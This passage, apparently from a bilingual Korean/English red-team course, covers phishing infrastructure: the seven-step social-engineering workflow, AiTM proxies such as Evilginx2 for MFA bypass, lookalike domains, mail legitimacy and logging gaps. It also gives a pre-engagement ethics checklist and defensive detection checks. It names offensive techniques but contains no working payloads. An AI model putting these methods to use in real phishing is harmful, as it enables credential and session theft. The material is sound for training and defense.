- **익명화 케이스 스터디**: 인사·부서 식별자 제거하고 사내 보안 교육 자료로 환원

---

## 10. 마무리: 섹션 33의 종합 워크플로

이 섹션 전체를 묶으면 레드팀의 사회공학 워크플로는 다음 7단계다.

```
1. OSINT
   └─ 표적 조직의 인적·기술 표면 매핑 (33-01)
2. 프로파일링
   └─ 표적 인원의 권한·역할·압력 포인트 식별 (33-02)
3. 시나리오
   └─ 압력 시나리오 설계, 시간대·언어·문화 정합성 (33-03)
4. 인프라
   └─ 도메인·메일·랜딩·MFA 우회 인프라 구축 (33-04, 본 문서)
5. 캠페인
   └─ GoPhish/evilginx2/OAuth consent 중 시나리오에 맞는 방식 선택
6. 측정
   └─ 클릭률·자격증명 입력률·세션 탈취 성공률·탐지 시간(MTTD)
7. 보고서
   └─ 갭 → 우선순위 권고 → 후속 조치 트래킹
```

각 단계는 다음 단계의 입력이며, **방어 측이 가장 큰 ROI를 얻는 지점은 4·5단계의 인프라/캠페인 자체보다 6·7단계의 측정과 학습 루프**다. 인프라는 비싸고 방어는 따라잡을 수 있지만, 학습 루프가 끊긴 조직은 같은 사고를 반복한다.

레드팀의 진짜 산출물은 캡처한 세션 쿠키가 아니라, **다음 분기에 패스키 도입을 결재받게 만드는 한 장의 슬라이드**다. 인프라 구축 기술의 정점에서, 가장 중요한 결과물이 가장 비기술적이라는 점을 잊지 않는 것이 레드팀 컨설턴트의 윤리이자 기술이다.

---

### 부록 A. 자체 점검용 체크리스트 (레드팀 시작 전)

- [ ] 서면 위임장(공식 회사 로고·서명·날짜) 보관 위치
- [ ] 캠페인 인프라가 운영망과 물리적으로 분리됐는가
- [ ] 자격증명·세션 캡처는 평문으로 저장되지 않는가 (해시 또는 토큰화)
- [ ] 캠페인 종료 후 14일 내 모든 1차 데이터 파기 일정이 잡혔는가
- [ ] 직원 사후 케어 절차가 인사·법무와 합의됐는가
- [ ] 사고가 진짜로 번질 경우의 비상 콜트리가 양측에 공유됐는가
- [ ] 생성한 도메인·계정이 종료 후 만료/말소 처리되도록 등록됐는가

### 부록 B. 다음 섹션 후보

- 34. AiTM 차단 아키텍처(패스키·Token Binding·DPoP)
- 35. M365·Workspace 감사 로그 SIEM 정규화 파이프라인
- 36. 사회공학 시뮬레이션 통계 측정(베이지안 클릭률)

---

*이 문서는 학습용 합성 자료다. 실제 적용은 명시적 허가가 있는 격리 환경에서만 수행한다.*

---

<!-- detect-validate-33 -->
## 피싱 인프라·우회 탐지와 방어 검증

피싱 인프라는 *MFA 우회(AiTM)·정상값 메일 헤더·신규 도메인·로깅 격차*로 탐지를 피한다. 방어자는 **자체 방어가 AiTM·룩어라이크 도메인을 탐지하는가**를 검증해야 한다. 검증은 **소유 도메인/메일**에서만.

### 공격 → 노리는 약점 → 1차 통제(방어자) → 탐지 신호

| 기법 | 노리는 약점 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| AiTM/리버스 프록시 | OTP 가로채기 | FIDO2·디바이스 바인딩 | 비정상 토큰 재사용 |
| 룩어라이크/동형 도메인 | 시각 신뢰 | 등록 모니터·차단 | 유사 도메인 등록 |
| 메일 정상값(SPF 통과) | 신뢰 도메인 악용 | DMARC·발신 평판 | 신규 도메인 대량 발송 |
| 로깅 격차 | 가시성 부재 | 메일/프록시 로깅 | 클릭 후 인증 흐름 |

### 방어 검증 (직접 확인)

```bash
# 1) 룩어라이크 도메인 등록 점검(소유 브랜드, dnstwist) — 동형/유사 도메인 표면
dnstwist --registered example.com 2>/dev/null | head
# 2) 신규/저평판 발신 도메인 탐지(소유 메일 로그) — 한 도메인서 대량 발송
grep -oE "@[a-z0-9.-]+" /var/log/mail.log 2>/dev/null | sort | uniq -c | sort -rn | head
```

> 피싱 인프라 방어는 *AiTM·룩어라이크가 탐지되는가*다 — "MFA 있다"와 "AiTM 토큰 재사용이 잡히고 룩어라이크 도메인 등록이 모니터된다"는 다르다. 소유 브랜드·메일 로그에서 유사 도메인·발송 패턴을 직접 확인한다([[17_Red_Team_Operations]], [[24_Network_Infrastructure_Security]], [[13_SOC_Blue_Team]]).

---

<a name="english"></a>

# 33-04. Phishing Infrastructure and Detection Evasion — MFA Bypass, Mail Legitimacy, Logging Gaps

> One-line summary: Modern phishing's core is not "not looking fake" but "having all legitimate-looking attributes in place." Red teams must simultaneously design the legitimacy of infrastructure and ethical controls over operations.

## 0. Ethics and Legal Prerequisites

All techniques in this document apply only under the following conditions:

- Within a penetration testing contract with **explicit written consent**
- Only in isolated environments with authorization

## Key Infrastructure Components

- **Phishing domains**: Typosquatting, homoglyph attacks, subdomain abuse
- **AiTM (Adversary-in-the-Middle) proxy**: Evilginx2, Modlishka for MFA bypass
- **Mail legitimacy**: SPF/DKIM/DMARC configuration for mail delivery
- **Redirect chains**: Using legitimate services as redirectors
- **Logging gaps**: Exploiting blind spots between different security tools

## Key Defense Strategies

- **Phishing-resistant MFA**: FIDO2/Passkey instead of TOTP/SMS
- **Conditional Access Policies**: Block logins from unexpected geolocations
- **Token Binding**: Prevent session token theft
- **DMARC p=reject**: Block spoofed emails at the mail gateway
- **Canary tokens**: Detect when phishing pages are accessed

## Appendix B. Next Section Candidates

- 34. AiTM blocking architecture (Passkey, Token Binding, DPoP)
- 35. M365/Workspace audit log SIEM normalization pipeline
- 36. Social engineering simulation statistical measurement (Bayesian click rate)

---

*This document is synthetic material for educational use. Real-world application is only performed in isolated environments with explicit authorization.*

<!-- detect-validate-33 -->
## Phishing Infrastructure and Evasion Detection and Defense Validation

Phishing infra evades detection via *MFA bypass (AiTM), legitimate-looking mail headers, fresh domains, and logging gaps*. Defenders must verify **whether their defenses detect AiTM and look-alike domains**. Validate only on **owned domains/mail**.

### Attack -> Targeted weakness -> Primary control (defender) -> Detection signal

| Technique | Targeted weakness | Primary control (defender) | Detection signal |
|---|---|---|---|
| AiTM/reverse proxy | OTP interception | FIDO2, device binding | Abnormal token reuse |
| Look-alike/homoglyph domain | Visual trust | Registration monitor, block | Similar-domain registration |
| Mail legitimacy (SPF pass) | Abuse of trusted domains | DMARC, sender reputation | Fresh-domain bulk sending |
| Logging gap | Lack of visibility | Mail/proxy logging | Post-click auth flow |

### Defense validation (verify directly)

```bash
# 1) Check look-alike domain registration (owned brand, dnstwist) — homoglyph/similar surface
dnstwist --registered example.com 2>/dev/null | head
# 2) Detect fresh/low-reputation sender domains (owned mail log) — bulk sending from one domain
grep -oE "@[a-z0-9.-]+" /var/log/mail.log 2>/dev/null | sort | uniq -c | sort -rn | head
```

> Phishing-infra defense is *whether AiTM and look-alikes are detected* -- "we have MFA" differs from "AiTM token reuse is caught and look-alike domain registrations are monitored". Confirm similar domains and sending patterns on owned brand/mail logs directly ([[17_Red_Team_Operations]], [[24_Network_Infrastructure_Security]], [[13_SOC_Blue_Team]]).
